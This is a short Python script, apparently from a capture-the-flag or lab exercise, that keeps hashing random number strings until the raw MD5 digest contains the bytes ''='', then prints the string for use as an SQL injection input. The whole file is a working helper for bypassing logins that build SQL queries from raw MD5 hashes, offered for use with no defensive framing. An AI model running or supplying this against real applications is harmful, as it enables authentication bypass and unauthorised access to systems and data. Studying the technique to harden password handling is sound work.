from pymd5 import md5
import random, re

#Generates random hashes until the string ('=') is in the raw binary and outputs the input for the SQL injection.

#Resource: http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes

while(True):
    maxint = (2**32)/2 - 1
    teststr = ""
    for i in range(0,3):
        teststr += str(random.randint(0, maxint))
    md5hash = md5()
    md5hash.update(teststr)
    # search the byte object with regex
    match = re.search(rb"'='", md5hash.digest())
    if match:
        print("SQL input:", teststr)
        break
